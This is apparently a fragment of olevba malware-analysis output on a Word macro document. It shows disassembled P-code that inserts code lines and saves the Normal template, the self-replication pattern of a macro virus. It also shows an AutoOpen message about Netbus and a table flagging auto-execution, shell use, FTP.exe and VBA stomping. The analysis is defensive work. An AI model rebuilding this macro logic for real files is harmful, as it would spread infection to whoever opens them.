' 	Label IMNXTSG 
' 	LitDI2 0x0001 
' 	Ld ResetMe 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #138:
' 	Label WYEMOHMC 
' 	EndWith 
' Line #139:
' 	Label CYFQWU 
' Line #140:
' 	Ld DDDDDD 
' 	St NN 
' Line #141:
' 	Label BPBLNVWOJ 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #142:
' 	Ld YYY 
' 	St HH 
' Line #143:
' 	Label OBMFTXIDVL 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #144:
' 	EndSub 
' Macros/VBA/Modul1 - 1009 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	LitStr 0x0024 "No Netbus server found in the memory"
' 	ArgsCall MsgBox 0x0001 
' Line #2:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |FTP.exe             |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

